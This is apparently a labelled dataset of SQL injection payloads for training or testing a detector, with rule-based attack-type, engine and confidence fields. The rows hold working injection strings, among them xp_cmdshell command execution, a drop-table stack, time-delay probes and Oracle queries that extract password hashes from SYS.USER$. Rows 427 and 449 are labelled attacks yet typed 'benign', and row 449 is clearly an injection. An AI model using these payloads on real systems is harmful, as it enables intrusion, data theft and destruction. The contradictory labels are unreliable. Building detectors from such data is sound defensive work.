row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
420,declare @s varchar ( 200 ) select @s = 0x73656c65637420404076657273696f6e exec ( @s ),1,,rce,generic,0.95,"0x73656c65637420404076657273696f6e, declare @s varchar detected — rce injection (priority 1) on generic",rule-based
421,select * from users where id = '1' or 1 = 1 -- 1',1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
422,AND 1 = utl_inaddr.get_host_address ( ( SELECT COUNT ( DISTINCT ( table_name ) ) FROM sys.all_tables ) ) AND 'i' = 'i,1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
423,"select * from users where id = '1' union select @ 1,version ( ) -- 1'",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
424,"admin"" ) or ( ""1"" = ""1""#",1,,boolean_blind,generic,0.95,) or ( detected — boolean_blind injection (priority 8) on generic,rule-based
425,"select * from users where id = 1 or 1#"", union select 'a',version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
426,"select * from users where id = 1 or ""$ ( "" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
427,or '' ',1,,benign,generic,0.8,No attack signals detected in payload,rule-based
428,"select * from users where id = 1 or "";#"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
429,; drop table temp --,1,,stacked_queries,generic,0.95,"; drop , drop table detected — stacked_queries injection (priority 3) on generic",rule-based
430,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 2 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
431,""" or benchmark ( 10000000,MD5 ( 1 ) ) #",1,,time_blind,generic,0.95,benchmark ( is database-specific time-delay function — time-based blind inference (priority 5),rule-based
432,""" or ""x"" = ""x",1,,boolean_blind,generic,0.85,"or ""x"" = ""x detected — boolean_blind injection (priority 8) on generic",rule-based
433,select * from users where id = '1'<@.. or 1 = 1 -- 1',1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
434,"select * from users where id = 1 or !<@ union select 1,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @ union select detected — union_based injection (priority 7) on generic",rule-based
435,or 'something' like 'some%',1,,boolean_blind,generic,0.95,like ' detected — boolean_blind injection (priority 8) on generic,rule-based
436,; if not ( ( select serverproperty ( 'isintegratedsecurityonly' ) ) <> 0 ) waitfor delay '0:0:2' --,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
437,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 4 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
438,select * from users where id = '1' or \<\. or 1 = 1 -- 1',1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
439,; exec master..xp_cmdshell 'ping 10.10.1.2'--,1,,rce,mssql,0.95,"xp_cmdshell, exec master detected — rce injection (priority 1) on mssql",rule-based
440,admin' or '1' = '1'--,1,,boolean_blind,generic,0.95,or '1' = '1' detected — boolean_blind injection (priority 8) on generic,rule-based
441,; if not ( ( select serverproperty ( 'isintegratedsecurityonly' ) ) <> 1 ) waitfor delay '0:0:2' --,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
442,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 2 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
443,"select * from users where id = 1 <@<@ union select version ( ) ,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @<@ union select detected — union_based injection (priority 7) on generic",rule-based
444,"select * from users where id = 1 or 1#""$ union select null,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
445,""";waitfor delay '0:0:__TIME__'--",1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
446,select * from users where id = '1' *$ 1 or 1 = 1 -- 1',1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
447,"select * from users where id = 1 or \<\ union select null,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
448,"select * from users where id = 1 or ""?@"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
449,’ or ‘1’ = ’1,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
